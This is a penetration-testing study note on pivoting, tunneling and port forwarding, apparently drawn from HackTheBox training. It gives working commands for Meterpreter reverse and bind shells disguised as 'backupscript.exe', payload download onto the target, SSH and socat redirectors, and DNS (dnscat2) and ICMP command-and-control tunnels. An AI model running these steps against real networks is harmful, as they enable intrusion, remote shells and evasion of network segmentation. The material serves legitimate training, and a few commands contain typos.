---
title: Notes | Pivoting, Tunneling, and Port Forwarding
author: Zeropio
date: 2022-08-09
categories: [Notes, System]
tags: [pivoting, tunneling, port-forwarding]
permalink: /notes/system/pivoting-tunneling-portforwarding
---

> All the images from this post is from HackTheBox.

During a pentesting we will often find credentials, ssh keys, hashes, or access tokens to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a **pivot host**. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments.

There are many different terms used to describe a compromised host that we can use to pivot to a previously unreachable network segment. Some of the most common are:
- Pivot Host
- Proxy
- Foothold
- Beach Head system
- Jump Host

Pivoting's primary use is to defeat segmentation to access an isolated network. **Tunneling**, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. With pivoting, we will notice that this is often referred to as **Lateral Movement**. 

Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment. Pivoting is utilizing multiple hosts to cross network boundaries you would not usually have access to. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.

Every computer that is communicating on a network needs an IP address. Static IP assignment is common with:
- Servers
- Routers
- Switch virtual interfaces
- Printers
- And any devices that are providing critical services to the network

Whether assigned dynamically or statically, the IP address is assigned to a **Network Interface Controller** (**NIC**). NIC is referred to as a **Network Interface Card** or **Network Adapter**. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like `ifconfig` and `ipconfig`.

It is common to think of a network appliance that connects us to the Internet when thinking about a router, but technically any computer can become a router and participate in routing. One way we will see this is through the use of **AutoRoute**, which allows our attack box to have routes to target networks that are reachable through a pivot host. One key defining characteristic of a router is that it has a routing table that it uses to forward traffic based on the destination IP address.
```console
zero@pio$ netstat -r
```

Any traffic destined for networks not present in the routing table will be sent to the default route, which can also be referred to as the default gateway or gateway of last resort. When looking for opportunities to pivot, it can be helpful to look at the hosts' routing table to identify which networks we may be able to reach or which routes we may need to add.

**Protocols** are the rules that govern network communications. Many protocols and services have corresponding ports that act as identifiers. Connecting to specific ports that a device is **listening** on can often allow us to use ports & protocols that are **permitted** in the firewall to gain a foothold on the network.

---

# Tunneling 

**Port Forwarding** is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. Different application layer protocols such as **SSH** or even **SOCKS** can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.

## Dynamic Port Forwarding with SSH and SOCKS 

Let's take an example from the below image.

![SSH Forwarding](/assets/img/notes/system/11.png)

Start scanning the pivoting target (Ubuntu):
```console
zero@pio$ nmap -sT -p22,3306 <PIVOT TARGET>
```

To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding.

we will use the below command to forward our local port (1234) over SSH to the Ubuntu server:
```console
zero@pio$ ssh -L 1234:localhost:3306 Ubuntu@<TARGET IP>
```

The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. We can verify it:
```console
zero@pio$ netstat -antp | grep 1234

tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh  
```

```console
zero@pio$ nmap -v -sV -p1234 localhost 

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

If we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local `port:server:port` argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080:
```console
zero@pio$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<TARGET IP>
```

Now, if you type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:
- One connected to our attack host
- One communicating to other hosts within a different network
- The loopback interface

In real cases scenarios, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (`172.16.5.1-200`) network or the entire subnet (`172.16.5.0/23`). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform **dynamic port forwarding** and **pivot** our network packets via the Ubuntu server. We can do this by starting a **SOCKS listener** on our **localhost** and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called **SSH tunneling** over **SOCKS proxy**. SOCKS stands for **Socket Secure**. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. SOCKS proxies are currently of two types: **SOCKS4** and **SOCKS5**. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that.

Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly:

![NAT network](/assets/img/notes/system/22.png)


The SSH client send a request to the SSH server to send some TCP data over the ssh socket. The SSH client then starts listening on localhost:9050. Whatever data you send here will be broadcasted to the entire network over SSH. We can use the below command to perform this **dynamic port forwarding**:
```console
zero@pio$ ssh -D 9050 ubuntu@<TARGET PIVOT>
```

The `-D` argument requests the SSH server to enable dynamic port forwarding. Now we need a tool that can route packets over the **port 9050**, for example `proxychains`. Proxychains is often used to force an application's **TCP traffic** to go through hosted proxies like **SOCKS4**/**SOCKS5**, **TOR**, or **HTTP/HTTPS** proxies. To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`{: .filepath}. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there:
```console
zero@pio$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Now send the Nmap packets with proxychains:
```console
zero@pio$ proxychains nmap -v -sn <NETWORK, PE 172.16.5.1-200>
```

This is called **SOCKS tunneling**. We can only perform a **full TCP connect scan** over proxychains. Proxychains cannot understand partial packets, if you send partial packets like half connect scans, it will return incorrect results. Probably, the pings won't work due to the Windows' firewall. A full TCP connect scan without ping on an entire network range will take a long time. 

We can do it to a single target as:
```console
zero@pio$ proxychains nmap -v -Pn -sT <TARGET>
```

We can also use **Metasploit** to do it:
```console
zero@pio$ proxychains msfconsole
```

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For example, a RDP connection:
```console
zero@pio$ proxychains xfreerdp /v:<TARGET> /u:<USER> /p:<PASSWORD>
```

## Remote/Reverse Port Forwarding with SSH

Sometimes, we might want to forward a local service to the remote port. During a pentesting RDP is not always aviable. We might want to upload or download files, use exploits,.. In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the target. Finding a host that can connect us (the attacker) with the target machine. 

![Example image](/assets/img/notes/system/33.png)

With the last image, tet's try with a reverse shell. First, start with creating one with `msfvenom`:
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<Interal IP of Pivot Host> -f exe -o backupscript.exe LPORT=8080
```

Prepare the listener port:
```console
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

Now send the file to the pivot host, for example with `scp`:
```console
zero@pio$ scp backupscript.exe ubuntu@<Interal IP of Pivot Host>:~/
```

Now send the the payload to the target machine. We can do it with a Python HTTP server:
```console
ubuntu@pivot$ python3 -m http.server <PORT>
```

We can download this **backupscript.exe** from the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`:
```console
PS C:\>  Invoke-WebRequest -Uri "http://<Interal IP of Pivot Host>:<PORT>/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Now we can use the **SSH remote port forwarding** to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080:
```console
zero@pio$ ssh -R <Internal IP of Pivot Host>:8080:0.0.0.0:8000 ubuntu@<ip Address of Target> -vN
```

The flag `-vN` make it  verbose and ask it not to prompt the login shell. The `-R` ask the Ubuntu server to listen on `<Internal IP of Pivot Host>:8080` and forward all incoming connections on port **8080** to our msfconsole listener on `0.0.0.0:8000` of our **attack host**.

After creating the SSH remote port forward, we can execute the payload from the Windows target. If everything works, we can see the logs in the pivot machine, and the shell in the Meterpreter.

Our Meterpreter session should list that our incoming connection is from a local host itself (`127.0.0.1`) since we are receiving the connection over the local **SSH socket**, which created an **outbound** connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.

This will be the final output:

![Final Remote Port Forwarding](/assets/img/notes/system/44.png)

## Meterpreter Tunneling & Port Forwarding 

We can still create a pivot with our Meterpreter session without relying on SSH port forwarding. First create the payload for the **Pivot Host**:
```console
zero@pio$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<PIVOT IP> -f elf -o backupjob LPORT=8080
```

Start the **multi/handler**:
```console
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

Send the payload to the **Pivot Host** and execute it. Now we must have our Meterpreter session. We can start with the `ping_sweep` module to discover hosts:
```console
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

We can also do the ping sweep directly in the shell, for bash:
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

For CMD:
```console
C:\> for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

And for PowerShell:
```console
PS C:\> 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

> It's good to try the ping sweep twice, because of the time it takes for a host to build it's arp cache when communicating across networks
{: .prompt-danger}

If a firewall is blocking our pings we can use Nmap for TCP scan. Meterpreter comes with the `socks_proxy` module to help us. We will configure the SOCKS proxy for **SOCKS version 4a**:
```console
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```

We can test it is working with the `jobs` command. Assure that proxychains is properly configure.

> Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
{: .prompt-tip}

Now use **AutoRoute**:
```console
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session:
```console
meterpreter > run autoroute -s 172.16.5.0/23 

...
[*] Use the -p option to list all active routes
```

```console
meterpreter > run autoroute -p 

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session:
```console
zero@pio$ proxychains nmap <TARGET> -p3389 -sT -v -Pn
```

We can also use the `portfwd`:
```console
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]
```

```console
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session:
```console
zero@pio$ xfreerdp /v:localhost:3300 /u:<USER> /p:<PASSWORD>
```

Similar to local port forwards, Metasploit can also perform **reverse port forwarding** with the below command:
```console
meterpreter > portfwd add -R -l 8081 -p 1234 -L <OUR IP>
```

```console
meterpreter > bg 

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server:
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT HOST> -f exe -o backupscript.exe LPORT=1234
```

Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

---

# Socat 

## Redirection with a Reverse Shell

**Socat** is a bidirectional relay tool that can create pipe sockets between **2 independent network channels** without needing to use SSH tunneling. We can start it in the pivot host:
```console
ubuntu@pivot$ socat TCP4-LISTEN:8080,fork TCP4:<OUR IP>:80
```

Once our redirector is configured, we can create a payload that will connect back to our redirector. 
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<TARGET> -f exe -o backupscript.exe LPORT=8080
```

Transfer the payload to the host and start a **multi/handler**:
```console
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
```

We can test this by running our payload on the windows host, and we should see a network connection from the Ubuntu server this time.

## Redirection with a Bind Shell

We can also create a socat bind shell redirector. In the case of bind shells, the Windows server will start a listener and bind to a particular port. 

![Example Image](/assets/img/notes/system/55.png)

Create the payload:
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

We can start a socat bind shell listener:
```console
ubuntu@pivot$ socat TCP4-LISTEN:8080,fork TCP4:<TARGET>:8443
```

Start the listener:
```console
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST <OUR IP>
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

---

# Pivoting Around Obstacles 

## SSH for Windows: plink.exe

[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. In the below image, we have a Windows-based attack host.

![Windows Plink Attack](/assets/img/notes/system/66.png)

We can use Plink as follows:
```console
C:\pivot-host> plink -D 9050 ubuntu@<TARGET>
```

We can also use [Proxifier](https://www.proxifier.com/) to start a SOCKS tunnel.  Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. 

## SSH Pivoting with Sshuttle 

[sshuttle](https://github.com/sshuttle/sshuttle) is another too which removes the need to configure proxychains. This tool only works for pivoting over SSH, not TOR or HTTPS.
```console
zero@pio$ sudo sshuttle -r ubuntu@<PIVOT HOST> 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host. Now we can send commands as always:
```console
zero@pio$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

## Web Server Pivoting with Rpivot 

Rpivot is a reverse SOCKS proxy tool for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. With the following image:

![Web Server Pivoting](/assets/img/notes/system/77.png)

We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections:
```console
zero@pio$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:
```console
zero@pio$ scp -r rpivot ubuntu@<Pivot Host>:~/
```

```console
ubuntu@pivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

Now we wil be connected to the machine. Finally, we should be able to access the webserver on our server-side:
```console
zero@pio$ proxychains firefox-esr 172.16.5.135:80
```

Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password:
```console
zero@pio$ python client.py --server-ip <<TARGET> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <NAME OF WINDOWS DOMAIN> --username <USERNAME> --password <PASSWORD>
```

## Port Forwarding with Windows Netsh 

Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
- Finding routes
- Viewing the firewall configuration
- Adding proxies
- Creating port forwarding rules

![Windows Netsh](/assets/img/notes/system/88.png)

We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port:
```console
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<PIVOT HOST> connectport=3389 connectaddress=<TARGET>
```

We can verify it:
```console
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

After configuring the **portproxy** on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp.

---

# Branching Out Our Tunnels 

## DNS Tunneling with Dnscat2

Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted **Command-&-Control** (**C&C** or **C2**) channel and sends data inside TXT records within the DNS protocol. We can install as:
```console
zero@pio$ git clone https://github.com/iagox86/dnscat2.git
zero@pio$ cd dnscat2/server/
zero@pio$ gem install bundler
zero@pio$ bundle install
```

We can then start the dnscat2 server:
```console
sudo ruby dnscat2.rb --dns host=<OUR IP>,port=53,domain=inlanefreight.local --no-cache
```

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use their client or the [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell). 
```console
PS C:\target> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host:
```console
PS C:\target> Start-Dnscat2 -DNSserver <OUR IP> -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. Inside dnscat we can list all our options:
```console
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

For exmaple, if we want to spawn a shell:
```console
dnscat2> window -i 1
```

## SOCKS5 Tunneling with Chisel 

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool that uses HTTP to transport data that is secured using SSH. Before we can use Chisel, we need to have it on our attack host:
```console
zero@pio$ git clone https://github.com/jpillora/chisel.git
zero@pio$ cd chisel; go build
```

Once the binary is built, we can use SCP to transfer it to the target pivot host:
```console
zero@pio$ scp chisel ubuntu@<PIVOT HOST>:~/
```

Then we can start the Chisel server/listener:
```console
ubuntu@pivot$ ./chisel server -v -p 1234 --socks5
```

We can start a client on our attack host and connect to the Chisel server:
```console
zero@pio$ ./chisel client -v <PIVOT HOST>:1234 socks
```

Now we can modify our proxychains.conf file located at `/etc/proxychains.conf`{: .filepath} and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel:
```console
zero@pio$ tail -f /etc/proxychains.conf  

# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now we can pivot:
```console
zero@pio$ proxychains xfreerdp /v:<TARGET> /u:<USER> /p:<PASSWORD>
```

There may be scenarios where firewall rules restrict inbound connections to our compromised target. Then we need to use Chisel in a reverse version:
```console
zero@pio$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

Then we connect from the pivot host:
```console
ubuntu@pivot$ ./chisel client -v <OUR IP>:1234 R:socks
```

Check the conf file:
```console
zero@pio$ tail -f /etc/proxychains.conf 

# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

And now use proxychains as always:
```console
zero@pio$ proxychains xfreerdp /v:<TARGET> /u:<USER> /p:<PASSWORD>
```

## ICMP Tunneling with SOCKS 

ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. 
```console
zero@pio$ git clone https://github.com/utoni/ptunnel-ng.git
zero@pio$ sudo ./autogen.sh 
```

Transfer to the pivot host:
```console
zero@pio$ scp -r ptunnel-ng ubuntu@<PIVOT HOST>:~/
```

Run it:
```console
ubuntu@pivot:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r<PIVOT HOST> -R22
```

Now in our machine:
```console
zero@pio$ sudo ./ptunnel-ng -p<PIVOT HOST> -l2222 -r<PIVOT HOST> -R22
```

Now we can use SSH through the port 2222:
```console
zero@pio$ ssh -p2222 -lubuntu 127.0.0.1
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways:
```console
zero@pio$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
zero@pio$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

# Double Pivots 

## RDP and SOCKS Tunneling with SocksOverRDP

There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. The tool [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) could help us about this. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:
- [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
- [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe:
```console
C:\pivot> regsvr32.exe SocksOverRDP-Plugin.dll
```

Now we can connect through RDP, we will see a prompt saying that SocksOverRDP is enable. We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to the target. Then start it with admin privileges. When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080:
```console
C:\pivot> netstat -antb | findstr 1080

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

After starting our listener, we can transfer Proxifier portable to the Windows 10 target and configure it to forward all our packets to 127.0.0.1:1080. With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic.

> RDP may be slow in this assesment. We could go to `Experience > Performance` and set it to `Modem`.

---

# Tools 

| **Link**   | **Description**    |
|--------------- | --------------- |
| [proxychains](https://github.com/haad/proxychains) | a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy |
| [PuTTY / Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) | free implementation of SSH and Telnet for Windows and Unix platforms |
| [sshuttle](https://github.com/sshuttle/sshuttle) | transparent proxy server that works as a poor man's VPN |
| [RPIVOT](https://github.com/klsecservices/rpivot) | socks4 reverse proxy for penetration testing |
| [Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) | is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running |
| [dnscat2](https://github.com/iagox86/dnscat2) | DNS tunnel |
| [Chisel](https://github.com/jpillora/chisel) | A fast TCP/UDP tunnel over HTTP |
| [ptunnel-ng](https://github.com/utoni/ptunnel-ng) | Tunnel TCP connections through ICMP |
| [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) | Socks5/4/4a Proxy support for Remote Desktop Protocol / Terminal Services / Citrix / XenApp / XenDesktop |

